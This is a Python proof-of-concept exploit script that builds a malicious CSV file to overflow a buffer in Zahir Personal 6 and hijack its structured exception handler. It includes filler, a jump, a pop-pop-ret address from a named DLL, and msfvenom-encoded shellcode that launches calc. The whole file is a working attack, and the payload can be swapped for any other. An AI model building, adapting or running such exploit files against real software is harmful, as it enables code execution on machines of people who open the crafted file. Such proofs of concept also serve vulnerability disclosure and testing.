#!/usr/bin/python

import struct

bag1 = "A" * 2500
pisah = '\r\n'
bag2 = "B" * 380
nseh = "\xeb\x08\x90\x90"
seh = struct.pack('<L',0x52016661) #seh pop ecx # pop ebp # ret 0x04 (C:\Program Files\Zahir Personal 6 - Demo Version\vclie100.bpl)
nop = "\x90\x90\x90\x90"
# msfvenom -p windows/exec CMD=calc -a x86 -b '\x00\x0a\x0d\x22\x2c' -n 20 -e x86/shikata_ga_nai -f python -v sc
# x86/shikata_ga_nai chosen with final size 216
# Payload size: 236 bytes
# badchars are 00,0a,0d,22,2c
sc =  ""
sc += "\x92\x9f\x3f\x93\x40\x37\x91\x4b\x93\x3f\x48\x27\x42"
sc += "\x2f\x98\x93\xf8\x27\x4a\xf5\xdb\xc2\xb8\x9a\x4f\x6e"
sc += "\x3e\xd9\x74\x24\xf4\x5b\x29\xc9\xb1\x30\x83\xeb\xfc"
sc += "\x31\x43\x14\x03\x43\x8e\xad\x9b\xc2\x46\xb3\x64\x3b"
sc += "\x96\xd4\xed\xde\xa7\xd4\x8a\xab\x97\xe4\xd9\xfe\x1b"
sc += "\x8e\x8c\xea\xa8\xe2\x18\x1c\x19\x48\x7f\x13\x9a\xe1"
sc += "\x43\x32\x18\xf8\x97\x94\x21\x33\xea\xd5\x66\x2e\x07"
sc += "\x87\x3f\x24\xba\x38\x34\x70\x07\xb2\x06\x94\x0f\x27"
sc += "\xde\x97\x3e\xf6\x55\xce\xe0\xf8\xba\x7a\xa9\xe2\xdf"
sc += "\x47\x63\x98\x2b\x33\x72\x48\x62\xbc\xd9\xb5\x4b\x4f"
sc += "\x23\xf1\x6b\xb0\x56\x0b\x88\x4d\x61\xc8\xf3\x89\xe4"
sc += "\xcb\x53\x59\x5e\x30\x62\x8e\x39\xb3\x68\x7b\x4d\x9b"
sc += "\x6c\x7a\x82\x97\x88\xf7\x25\x78\x19\x43\x02\x5c\x42"
sc += "\x17\x2b\xc5\x2e\xf6\x54\x15\x91\xa7\xf0\x5d\x3f\xb3"
sc += "\x88\x3f\x55\x42\x1e\x3a\x1b\x44\x20\x45\x0b\x2d\x11"
sc += "\xce\xc4\x2a\xae\x05\xa1\xc5\xe4\x04\x83\x4d\xa1\xdc"
sc += "\x96\x13\x52\x0b\xd4\x2d\xd1\xbe\xa4\xc9\xc9\xca\xa1"
sc += "\x96\x4d\x26\xdb\x87\x3b\x48\x48\xa7\x69\x2b\x0f\x3b"
sc += "\xf1\xac"

tambahan = "D" * (5000-len(bag1+pisah+bag2+nseh+seh+nop+sc))

print "[+] Preparing for file..."
filename = "calc.csv"
f = open(filename, 'w')
print "[+] Writing crafted malicious CSV file.."
f.write(bag1+pisah+bag2+nseh+seh+nop+sc+tambahan)
f.close()
print "[+] File %s written successfully.. bring it to Mr. Zahir." %filename